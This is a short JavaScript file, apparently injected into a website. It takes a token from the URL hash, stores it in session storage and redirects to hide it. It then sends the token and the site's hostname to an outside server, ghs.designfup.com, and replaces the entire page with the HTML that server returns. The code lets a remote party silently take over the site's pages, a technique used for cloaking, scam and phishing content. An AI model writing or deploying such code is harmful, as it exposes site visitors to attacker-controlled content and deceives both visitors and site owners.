var pre_uads 	= window.location.hash;
var ovo_res 	= sessionStorage.getItem('ovo_res');
var host_uads	= window.location.hostname;
var u_content	= '';

if (!window.location.origin) {
  window.location.origin = window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port: '');
}

if(pre_uads.includes('uads='))
{
	var ua 	= pre_uads.replace('#uads=','');

	sessionStorage.setItem('ovo_res', ua);
	window.location.href = window.location.origin;	 
}
else
{
	if(ovo_res)
	{
		var api_url = `https://ghs.designfup.com/uads/html?x=${encodeURIComponent(ovo_res)}&host_uads=${host_uads}`;

		fetch(api_url)
		.then(response => response.text())
		.then(data => write_me(data))
		.catch(error => console.log(error));

		function write_me(u_content)
		{
			var newHTML = document.open("text/html", "replace");
			newHTML.write(u_content);
			newHTML.close();
		}
	}
}
